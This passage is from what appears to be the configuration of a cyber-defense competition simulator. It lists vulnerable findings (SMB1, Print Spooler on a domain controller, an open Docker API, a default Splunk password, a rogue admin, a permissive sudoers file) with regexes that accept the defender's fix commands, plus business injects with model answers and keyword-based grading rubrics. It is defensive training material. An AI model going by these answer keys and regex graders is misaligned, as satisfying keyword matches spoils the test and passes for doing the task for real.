      fix: { accept: [[/set-smbserverconfiguration/, /enablesmb1protocol/, /\$false/]], output: ['Done.'], why: 'Set-SmbServerConfiguration -EnableSMB1Protocol $false.' },
      traps: [],
    },
    {
      id: 'ad-spooler', host: 'ad', title: 'Print Spooler running on the domain controller', severity: 'High',
      teach: 'A DC has no reason to print. Stop it and disable it so it stays off.',
      exploitable: true, compromise: { impact: 'Red Team uses the spooler for code execution as SYSTEM.', penalty: 40 },
      fix: { steps: [
        { id: 'stop', accept: [/stop-service/, /spooler/], label: 'Stopped', todo: 'stop the spooler' },
        { id: 'off', accept: [/set-service|sc(\.exe)? config/, /spooler/, /disabled/], label: 'Disabled', todo: 'disable it at boot' },
      ], why: 'Stop, then disable.' },
      traps: [],
    },
    {
      id: 'docker-api', host: 'docker', title: 'Docker API open on 2375 without TLS', severity: 'Critical',
      teach: 'An open Docker API is remote root. A container with the host disk mounted is what that looks like afterwards.',
      exploitable: true, compromise: { impact: 'Red Team starts a privileged container and owns the host.', penalty: 45 },
      fix: { steps: [
        { id: 'fw', accept: [/new-netfirewallrule|netsh/, /2375/, /block/], label: 'Blocked 2375', todo: 'block port 2375' },
        { id: 'ct', accept: [/docker (rm|stop|kill)/, /maint|8fa21/], label: 'Removed the container', todo: 'remove the maint container' },
      ], why: 'Close the port and remove what came in through it.' },
      traps: [],
    },
    {
      id: 'splunk-default', host: 'splunk', title: 'Splunk admin still on the install password', severity: 'High',
      teach: 'Whoever owns the log server can read and erase your evidence.',
      exploitable: true, compromise: { impact: 'Red Team logs in to Splunk and reads every log you forward.', penalty: 30 },
      fix: { accept: [[/splunk/, /edit user admin/, /-password/]], output: ['User admin edited.'], why: 'splunk edit user admin -password ... -auth admin:changeme' },
      traps: [],
    },
    {
      id: 'wks-admin', host: 'win10', title: 'Unexplained local administrator on the workstation', severity: 'Medium',
      teach: 'Compare local Administrators to what you expect, then disable and remove.',
      exploitable: true, compromise: { impact: 'Red Team uses svc_print to move through the User network.', penalty: 25 },
      fix: { steps: [
        { id: 'dis', accept: [/disable-localuser|remove-localuser/, /svc_print/], label: 'Disabled', todo: 'disable svc_print' },
        { id: 'grp', accept: [/remove-localgroupmember|remove-localuser/, /svc_print/], label: 'Removed from Administrators', todo: 'remove it from Administrators' },
      ], why: 'Disable first, then remove from the group.' },
      traps: [],
    },
    {
      id: 'wks-sudoers', path: 'local', host: 'uwks', title: 'sudoers file gives every user root', severity: 'High',
      teach: 'Check /etc/sudoers.d as well as /etc/sudoers.',
      exploitable: true, compromise: { impact: 'Any login on the workstation is root.', penalty: 20 },
      fix: { accept: [[/\brm\b/, /sudoers\.d\/90-tmp/]], output: ['Removed.'], why: 'Remove the file and check sudo -l.' },
      traps: [],
    },
  ],

  injects: [
    {
      id: 'welcome', welcome: true, title: 'Welcome Inject', from: 'White Team', points: 0, releaseAt: 0, window: 86400,
      prompt: 'Reply before the drop flag: list your team name and school, your captain, each team member with their seat, and confirm that your team has read the rules. Consoles unlock at the drop flag.',
      model: 'Team name, captain, each member and their seat, a line confirming the rules.',
      rubric: [],
    },
    {
      id: 'inv-memo', title: 'Asset inventory', from: 'Operations', points: 25, releaseAt: 45,
      prompt: 'We were handed this network with no documentation. Send a table of every system: hostname, address, operating system and what it does.',
      model: 'A table with each VM, its internal and public address, its OS and its role.',
      rubric: [
        { label: 'names at least 4 hosts', re: /\b(docker|dns|web|ad|splunk|ecomm|mail)\b/i, min: 4 },
        { label: 'gives addresses', re: /\b172\.2\d\.\d{1,3}\.\d{1,3}\b/, min: 3 },
        { label: 'states operating systems', re: /windows|ubuntu|debian|centos|fedora|pan-?os/i, min: 2 },
        { label: 'states each role', re: /\b(dns|web|mail|e-?comm|splunk|domain controller|docker|firewall)\b/i, min: 3 },
      ],
    },
    {
      id: 'pw-policy', title: 'Password policy', from: 'CEO', points: 25, releaseAt: 180,
      prompt: 'Staff have been reusing passwords. Write a password policy memo for all staff, and say what you have changed already today.',
      model: 'A memo with length and complexity, no reuse, no sharing, what was done today, and how to get help.',
      rubric: [
        { label: 'minimum length', re: /\b(1[2-9]|[2-9]\d)\b.{0,20}(char|long|length)|length.{0,30}\b(1[2-9]|[2-9]\d)\b/i },
        { label: 'no reuse', re: /reus|history|previous password/i },
        { label: 'what changed today', re: /today|this morning|rotated|changed/i },
        { label: 'how staff get help', re: /help ?desk|contact|support|ticket/i },
      ],
    },
    {
      id: 'rdp-request', title: 'Request to open remote desktop', from: 'Sales Director', points: 25, releaseAt: 330,
      prompt: 'I need to reach my office PC from the road. Please open remote desktop to it from the internet by end of day.',
      model: 'Decline direct exposure and offer a VPN with MFA, explain why, keep the tone useful.',
      rubric: [
        { label: 'declines exposing RDP', re: /not (open|expos)|cannot|can't|decline|unable|will not/i },
        { label: 'offers a safe path', re: /\bvpn\b|gateway|bastion|jump/i },
        { label: 'requires MFA', re: /\bmfa\b|multi-?factor|two-?factor|2fa/i },
        { label: 'gives the business reason', re: /risk|attack|ransom|exposed|brute/i },
      ],
    },
    {
      id: 'eol-plan', title: 'End-of-life systems', from: 'Auditor', points: 25, releaseAt: 480,
      prompt: 'Several of your servers run operating systems that no longer receive updates. List them and give a plan.',
      model: 'Name Ubuntu 14.04, Debian 8.5, CentOS 7 and Fedora 21, give compensating controls now and a migration plan with dates.',
      rubric: [
        { label: 'names at least 3 EOL systems', re: /ubuntu 14|debian 8|centos 7|fedora 21/i, min: 3 },
        { label: 'compensating controls now', re: /firewall|segment|restrict|monitor|isolat/i },
        { label: 'migration plan', re: /migrat|upgrad|replac/i },
        { label: 'a timeline', re: /\b(q[1-4]|month|week|by (january|february|march|april|may|june|july|august|september|october|november|december)|20\d\d)\b/i },
      ],
    },
    {
      id: 'incident', title: 'Incident summary for leadership', from: 'CEO', points: 25, releaseAt: 660,
      prompt: 'I am told someone has been inside our network. Tell me in plain language what happened, what it touched and what you have done.',
      model: 'What happened, systems affected, source and destination addresses, a timeline, what was done, what comes next.',
      rubric: [
        { label: 'what happened', re: /attacker|red team|intruder|unauthori[sz]ed|compromis/i },
        { label: 'systems affected', re: /\b(web|ecomm|mail|dns|ad|docker|splunk|domain controller)\b/i },
        { label: 'source address', re: /\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/ },
        { label: 'a timeline', re: /\b\d{1,2}:\d{2}\b/ },
        { label: 'what you did', re: /remov|disabl|block|rotat|patch/i },
      ],
    },
  ],
};

withRecon(CCDC_MIDWEST);
export default CCDC_MIDWEST;
